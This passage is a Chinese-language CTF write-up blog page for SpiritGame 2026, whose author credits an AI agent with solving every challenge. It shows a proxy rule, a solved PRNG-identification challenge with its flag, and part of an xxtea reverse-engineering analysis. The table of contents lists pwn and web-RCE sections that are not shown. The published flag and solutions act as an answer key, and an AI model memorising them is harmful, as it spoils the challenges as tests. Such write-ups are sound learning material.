@@ -1,0 +1,903 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="SpiritGame 2026 - ST熊猫 WPCTF是什么?我跟CTF很熟吗???     这次的SpiritGame就是AI代理人战争,下次的CTF可能是更夸张的东西.反正是AI大人做的,那我写个游记交吧.   本场的所有flag均为AI大人拿到的,我是AI大人的狗…   这造成了一个很蛋疼的问题,我该分享提示词还是该分享AI的解密输出还是该分享AI的wp?我个人其实是倾向于提示词和解密输出">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SpiritGame 2026 wp">
+<meta property="og:url" content="https://narafluorine.github.io/2026/05/18/20025_SpiritGame2026_WP/index.html">
+<meta property="og:site_name" content="NaraFluorine&#39;s blog">
+<meta property="og:description" content="SpiritGame 2026 - ST熊猫 WPCTF是什么?我跟CTF很熟吗???     这次的SpiritGame就是AI代理人战争,下次的CTF可能是更夸张的东西.反正是AI大人做的,那我写个游记交吧.   本场的所有flag均为AI大人拿到的,我是AI大人的狗…   这造成了一个很蛋疼的问题,我该分享提示词还是该分享AI的解密输出还是该分享AI的wp?我个人其实是倾向于提示词和解密输出">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-05-18T11:55:35.000Z">
+<meta property="article:modified_time" content="2026-05-27T05:35:45.419Z">
+<meta property="article:author" content="Fluorine Wang">
+<meta property="article:tag" content="AI">
+<meta property="article:tag" content="Reverse">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="Crypto">
+<meta property="article:tag" content="Misc">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>SpiritGame 2026 wp</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.2.0"><link rel="alternate" href="/atom.xml" title="NaraFluorine's blog" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/friends/">友链</a></li><!--
+     --><!--
+       --><li><a href="/QSL/">QSL</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2026/05/24/60023_AI%E4%B8%8ELinux%E5%8D%B1%E6%9C%BA%E5%85%83%E5%B9%B4/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2026/05/16/70000_Attention_Is_All_You_Need/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://narafluorine.github.io/2026/05/18/20025_SpiritGame2026_WP/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://narafluorine.github.io/2026/05/18/20025_SpiritGame2026_WP/&text=SpiritGame 2026 wp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://narafluorine.github.io/2026/05/18/20025_SpiritGame2026_WP/&title=SpiritGame 2026 wp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://narafluorine.github.io/2026/05/18/20025_SpiritGame2026_WP/&is_video=false&description=SpiritGame 2026 wp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SpiritGame 2026 wp&body=Check out this article: https://narafluorine.github.io/2026/05/18/20025_SpiritGame2026_WP/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://narafluorine.github.io/2026/05/18/20025_SpiritGame2026_WP/&title=SpiritGame 2026 wp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://narafluorine.github.io/2026/05/18/20025_SpiritGame2026_WP/&title=SpiritGame 2026 wp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://narafluorine.github.io/2026/05/18/20025_SpiritGame2026_WP/&title=SpiritGame 2026 wp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://narafluorine.github.io/2026/05/18/20025_SpiritGame2026_WP/&title=SpiritGame 2026 wp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://narafluorine.github.io/2026/05/18/20025_SpiritGame2026_WP/&name=SpiritGame 2026 wp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://narafluorine.github.io/2026/05/18/20025_SpiritGame2026_WP/&t=SpiritGame 2026 wp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SpiritGame-2026-ST%E7%86%8A%E7%8C%AB-WP"><span class="toc-number">1.</span> <span class="toc-text">SpiritGame 2026 - ST熊猫 WP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#day-1"><span class="toc-number">1.1.</span> <span class="toc-text">day -1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#day-0"><span class="toc-number">1.2.</span> <span class="toc-text">day 0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Presudo-misc"><span class="toc-number">1.3.</span> <span class="toc-text">Presudo misc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xxtea-reverse"><span class="toc-number">1.4.</span> <span class="toc-text">xxtea reverse</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E7%BB%93%E8%AE%BA"><span class="toc-number">2.</span> <span class="toc-text">关键结论</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-sub-401969-%E6%81%92%E8%BF%94%E5%9B%9E-0"><span class="toc-number">2.1.</span> <span class="toc-text">1. sub_401969() 恒返回 0</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-sub-401D61-%E9%80%80%E5%8C%96%E4%B8%BA%E9%80%90%E5%AD%97%E8%8A%82%E6%AF%94%E8%BE%83"><span class="toc-number">3.</span> <span class="toc-text">2. sub_401D61() 退化为逐字节比较</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E7%9C%9F%E6%AD%A3%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">4.</span> <span class="toc-text">3. 真正的问题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%89%8D%E6%97%A0%E6%B3%95%E5%94%AF%E4%B8%80%E6%81%A2%E5%A4%8D-flag"><span class="toc-number">4.1.</span> <span class="toc-text">目前无法唯一恢复 flag</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%A0%E7%8E%B0%E5%9C%A8%E9%9C%80%E8%A6%81%E8%A1%A5%E5%85%85%E7%9A%84%E5%86%85%E5%AE%B9"><span class="toc-number">5.</span> <span class="toc-text">你现在需要补充的内容</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%8D%E8%BF%87%E5%8F%AF%E4%BB%A5%E7%A1%AE%E8%AE%A4%E7%9A%84%E4%B8%80%E7%82%B9"><span class="toc-number">6.</span> <span class="toc-text">不过可以确认的一点</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CythonChecker-reverse"><span class="toc-number">6.1.</span> <span class="toc-text">CythonChecker - reverse</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#I%E2%80%99m-a-human-reverse"><span class="toc-number">6.2.</span> <span class="toc-text">I’m a human - reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%B2%E8%BF%98%E5%8E%9F%E5%87%BA%E7%9A%84%E6%94%BB%E5%87%BB%E9%93%BE"><span class="toc-number">6.2.1.</span> <span class="toc-text">已还原出的攻击链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E7%BB%93%E8%AE%BA-1"><span class="toc-number">6.2.2.</span> <span class="toc-text">关键结论</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%B0%E5%9C%A8%E5%8D%A1%E4%BD%8F%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="toc-number">6.2.3.</span> <span class="toc-text">现在卡住的原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%80%E4%BB%A5%E7%9B%AE%E5%89%8D%E8%83%BD%E7%A1%AE%E8%AE%A4%E7%9A%84%E6%98%AF"><span class="toc-number">6.2.4.</span> <span class="toc-text">所以目前能确认的是</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E6%9C%AC%E5%9C%B0%E5%B7%B2%E7%BB%8F%E6%8F%90%E5%8F%96%E5%87%BA%E7%9A%84%E4%B8%AD%E9%97%B4%E6%96%87%E4%BB%B6"><span class="toc-number">6.2.5.</span> <span class="toc-text">我本地已经提取出的中间文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E8%AE%BA"><span class="toc-number">6.2.6.</span> <span class="toc-text">结论</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE"><span class="toc-number">6.2.7.</span> <span class="toc-text">关键证据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%98%E5%8E%9F%E9%93%BE"><span class="toc-number">6.2.8.</span> <span class="toc-text">还原链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E5%85%B3%E9%94%AE%E6%96%87%E4%BB%B6"><span class="toc-number">6.2.9.</span> <span class="toc-text">本地关键文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Trust-Collapse-web"><span class="toc-number">6.3.</span> <span class="toc-text">Trust Collapse - web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Link-Start-reverse"><span class="toc-number">6.4.</span> <span class="toc-text">Link Start! - reverse</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Large-pwn"><span class="toc-number">6.5.</span> <span class="toc-text">Large - pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E7%BB%93%E8%AE%BA"><span class="toc-number">6.5.1.</span> <span class="toc-text">题目结论</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">6.5.2.</span> <span class="toc-text">利用链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E9%AA%8C%E8%AF%81"><span class="toc-number">6.5.3.</span> <span class="toc-text">本地验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC"><span class="toc-number">6.5.4.</span> <span class="toc-text">脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%A0%E6%8B%BF%E5%88%B0%E9%9D%B6%E6%9C%BA%E5%90%8E%E7%9B%B4%E6%8E%A5%E8%B7%91"><span class="toc-number">6.5.5.</span> <span class="toc-text">你拿到靶机后直接跑</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Artifact-Relay-web"><span class="toc-number">6.6.</span> <span class="toc-text">Artifact Relay - web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#deliverables-misc"><span class="toc-number">6.7.</span> <span class="toc-text">deliverables - misc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#overflow-pwn"><span class="toc-number">6.8.</span> <span class="toc-text">overflow - pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%89%8D%E7%BB%93%E8%AE%BA"><span class="toc-number">6.8.1.</span> <span class="toc-text">目前结论</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4%E6%83%85%E5%86%B5"><span class="toc-number">6.8.2.</span> <span class="toc-text">保护情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E5%B7%B2%E7%BB%8F%E5%86%99%E5%A5%BD%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-number">6.8.3.</span> <span class="toc-text">我已经写好的文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E5%BD%93%E5%89%8D%E9%87%87%E7%94%A8%E7%9A%84%E8%BF%94%E5%9B%9E%E6%96%B9%E6%A1%88"><span class="toc-number">6.8.4.</span> <span class="toc-text">我当前采用的返回方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%A0%E7%8E%B0%E5%9C%A8%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E7%9C%8B"><span class="toc-number">6.8.5.</span> <span class="toc-text">你现在可以直接看</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%89%E4%BD%A0%E6%8B%BF%E5%88%B0%E9%9D%B6%E6%9C%BA%E5%90%8E"><span class="toc-number">6.8.6.</span> <span class="toc-text">等你拿到靶机后</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag"><span class="toc-number">6.8.7.</span> <span class="toc-text">flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E6%9E%9C"><span class="toc-number">6.8.8.</span> <span class="toc-text">结果</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%B4%E6%98%8E"><span class="toc-number">6.8.9.</span> <span class="toc-text">说明</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Seraphim-Crypto"><span class="toc-number">6.9.</span> <span class="toc-text">Seraphim - Crypto</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ouroboros-misc"><span class="toc-number">6.10.</span> <span class="toc-text">Ouroboros - misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ONNX-%E6%A8%A1%E5%9E%8B%E4%B8%8E%E2%80%9C%E8%A1%94%E5%B0%BE%E8%9B%87-Ouroboros-%E2%80%9D%E7%9A%84%E5%85%B3%E7%B3%BB"><span class="toc-number">6.10.1.</span> <span class="toc-text">ONNX 模型与“衔尾蛇 (Ouroboros)”的关系</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E8%BF%98%E5%8E%9F-Flag-%E7%9A%84%E6%80%9D%E8%B7%AF"><span class="toc-number">6.10.2.</span> <span class="toc-text">尝试还原 Flag 的思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E6%8F%90%E5%8F%96%E6%AF%94%E7%89%B9%E9%93%BE%EF%BC%88Bit-chain%EF%BC%89"><span class="toc-number">6.10.2.1.</span> <span class="toc-text">方法一：静态分析提取比特链（Bit-chain）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%E5%8A%A8%E6%80%81%E6%89%A7%E8%A1%8C%E6%A8%A1%E5%9E%8B%EF%BC%88%E6%8E%A8%E8%8D%90%EF%BC%8C%E6%9C%80%E5%BF%AB%E6%8D%B7%EF%BC%89"><span class="toc-number">6.10.2.2.</span> <span class="toc-text">方法二：动态执行模型（推荐，最快捷）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NULL-pwn"><span class="toc-number">6.11.</span> <span class="toc-text">NULL - pwn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flowforge-web"><span class="toc-number">6.12.</span> <span class="toc-text">flowforge - web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Flag"><span class="toc-number">6.13.</span> <span class="toc-text">Flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E6%94%BB%E5%87%BB%E9%93%BE%E8%B7%AF%E6%80%BB%E7%BB%93"><span class="toc-number">6.14.</span> <span class="toc-text">完整攻击链路总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">6.14.1.</span> <span class="toc-text">1. 信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Webhook-%E7%AD%BE%E5%90%8D%E4%B8%8D%E4%B8%80%E8%87%B4%E6%BC%8F%E6%B4%9E%EF%BC%88%E6%A0%B8%E5%BF%83-0day%EF%BC%89"><span class="toc-number">6.14.2.</span> <span class="toc-text">2. Webhook 签名不一致漏洞（核心 0day）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-MCP-%E8%8A%82%E7%82%B9%E6%B3%A8%E5%85%A5-%E2%86%92-RCE"><span class="toc-number">6.14.3.</span> <span class="toc-text">3. MCP 节点注入 → RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%A7%A6%E5%8F%91%E6%9E%84%E5%BB%BA%E8%8E%B7%E5%8F%96-secret-bundle"><span class="toc-number">6.14.4.</span> <span class="toc-text">4. 触发构建获取 secret bundle</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%B6%E8%8E%B7"><span class="toc-number">7.</span> <span class="toc-text">收获</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#skill"><span class="toc-number">7.1.</span> <span class="toc-text">skill</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%81%9A%E9%A2%98"><span class="toc-number">7.2.</span> <span class="toc-text">做题</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        SpiritGame 2026 wp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Fluorine Wang</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2026-05-18T11:55:35.000Z" class="dt-published" itemprop="datePublished">2026-05-18</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/AI/" rel="tag">AI</a>, <a class="p-category" href="/tags/Crypto/" rel="tag">Crypto</a>, <a class="p-category" href="/tags/Misc/" rel="tag">Misc</a>, <a class="p-category" href="/tags/PWN/" rel="tag">PWN</a>, <a class="p-category" href="/tags/Reverse/" rel="tag">Reverse</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="SpiritGame-2026-ST熊猫-WP"><a href="#SpiritGame-2026-ST熊猫-WP" class="headerlink" title="SpiritGame 2026 - ST熊猫 WP"></a>SpiritGame 2026 - ST熊猫 WP</h1><p>CTF是什么?我跟CTF很熟吗???    </p>
+<p>这次的SpiritGame就是AI代理人战争,下次的CTF可能是更夸张的东西.<br>反正是AI大人做的,那我写个游记交吧.  </p>
+<p>本场的所有flag均为AI大人拿到的,我是AI大人的狗…  </p>
+<p>这造成了一个很蛋疼的问题,我该分享提示词还是该分享AI的解密输出还是该分享AI的wp?<br>我个人其实是倾向于提示词和解密输出的,因为AI的wp很长,而且这个wp只要保证能复现就行,用AI复现也是一种复现…</p>
+<h2 id="day-1"><a href="#day-1" class="headerlink" title="day -1"></a>day -1</h2><p>比赛前一天才装codex,以往是用Cursor的.<br>如果说Cursor是冰的话,中转站就是西方树叶.<br>要开始堆自己的Skill了,不然真打不过别人.  </p>
+<p>队名随便想了一个,因为队内要加 <code>*</code> ,所以想以 <code>*ST</code> 为开头.又因为前段时间浏阳某个烟花厂炸了,虽然熊猫号称烟花第一股那段时间在停牌,但开盘必跌停…<br>所以队名就叫 <code>*ST熊猫</code> 了,slogan更是演都不演了,”退市！退市！！退市！！！”…<br>然后头像也随机从pix上找了一张圣娅,黄毛小狐狸可爱捏.</p>
+<h2 id="day-0"><a href="#day-0" class="headerlink" title="day 0"></a>day 0</h2><p>因为网站部署在内网必须要走直连,但是GPT又必须走代理,所以先解决一波Clash Verge的规则问题:</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">prepend:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;DOMAIN-SUFFIX,jlu-terminal.site,DIRECT&#x27;</span></span><br><span class="line"><span class="attr">append:</span> []</span><br><span class="line"><span class="attr">delete:</span> []</span><br></pre></td></tr></table></figure>
+<p>匹配所有前缀是这个的网站,走直连.保存之后右键再点使用才会使用这个新规则,不需要点更新.  </p>
+<h2 id="Presudo-misc"><a href="#Presudo-misc" class="headerlink" title="Presudo misc"></a>Presudo misc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[data.txt](data.txt) Pesudo Random</span><br><span class="line">众所周知，伪随机数有好多种....能识别吗？</span><br><span class="line">这是一个ctf题,还原flag</span><br></pre></td></tr></table></figure>
+<p>还原出来了，<code>flag</code> 是：</p>
+<p><code>SpiritGame&#123;wow_y0u_can_1dent1fy_th3_prng!&#125;</code></p>
+<p>关键识别结果：</p>
+<ul>
+<li>1 / 7 行：LCG <code>x = 1664525*x + 1013904223 mod 2^32</code> → <code>Spir</code> / <code>dent</code></li>
+<li>2 / 8 行：Park-Miller <code>x = 48271*x mod 2147483647</code> → <code>itGa</code> / <code>1fy_</code></li>
+<li>3 / 9 行：Java <code>Random.nextInt()</code>（48-bit LCG）→ <code>me&#123;w</code> / <code>th3_</code></li>
+<li>4 / 10 行：MSVC 风格 <code>rand</code>（<code>state = 214013*state + 2531011</code>, 输出 <code>state&gt;&gt;16</code>）→ <code>ow_y</code> / <code>prng</code></li>
+<li>5 / 11 行：<code>xorshift32(13,17,5)</code> → <code>0u_c</code> / <code>!&#125;</code>（末尾有 <code>\\x00\\x00</code> 填充）</li>
+<li>6 行：<code>splitmix32</code> 风格 → <code>an_1</code></li>
+</ul>
+<p>拼起来就是：<br><code>Spir</code> + <code>itGa</code> + <code>me&#123;w</code> + <code>ow_y</code> + <code>0u_c</code> + <code>an_1</code> + <code>dent</code> + <code>1fy_</code> + <code>th3_</code> + <code>prng</code> + <code>!&#125;</code></p>
+<p>如果你要，我可以把完整解题脚本也给你。</p>
+<h2 id="xxtea-reverse"><a href="#xxtea-reverse" class="headerlink" title="xxtea reverse"></a>xxtea reverse</h2><p>prompt太长了,就是把ida里面所有反编译的函数都塞进去,然后gpt说少一段数据,然后也塞进去.<br>一把梭了.(gpt网页端)</p>
+<hr>
+<p>这个题的核心并不在 <code>xxtea</code>，而是在：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)sub_401D61(v7, s, <span class="number">38LL</span>) &amp;&amp; !HIWORD(v8);</span><br></pre></td></tr></table></figure>
+<p>其中：</p>
+<ul>
+<li><code>sub_401D61()</code> 本质上退化成了 <strong>memcmp</strong></li>
+<li><code>sub_401969()</code> 永远返回 <code>0</code></li>
+<li>所有“复杂混淆”大部分只是噪声</li>
+</ul>
+<hr>
+<h1 id="关键结论"><a href="#关键结论" class="headerlink" title="关键结论"></a>关键结论</h1><h2 id="1-sub-401969-恒返回-0"><a href="#1-sub-401969-恒返回-0" class="headerlink" title="1. sub_401969() 恒返回 0"></a>1. <code>sub_401969()</code> 恒返回 0</h2><p>函数最后：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="number">0LL</span>;</span><br></pre></td></tr></table></figure>
+<p>因此：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n2 = v2 ^ sub_401969(...)</span><br></pre></td></tr></table></figure>
+<p>等价于：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n2 = v2</span><br></pre></td></tr></table></figure>
+<p>以及：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v8 = sub_401969(...) ^ v7</span><br></pre></td></tr></table></figure>
+<p>等价于：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v8 = v7</span><br></pre></td></tr></table></figure>
+<hr>
+<h1 id="2-sub-401D61-退化为逐字节比较"><a href="#2-sub-401D61-退化为逐字节比较" class="headerlink" title="2. sub_401D61() 退化为逐字节比较"></a>2. <code>sub_401D61()</code> 退化为逐字节比较</h1><p>核心：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v7 = a1[i] ^ s[i];</span><br><span class="line">v8 = <span class="number">0</span> ^ v7;</span><br><span class="line">v9 |= v8;</span><br></pre></td></tr></table></figure>
+<p>最终：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> v9 == <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
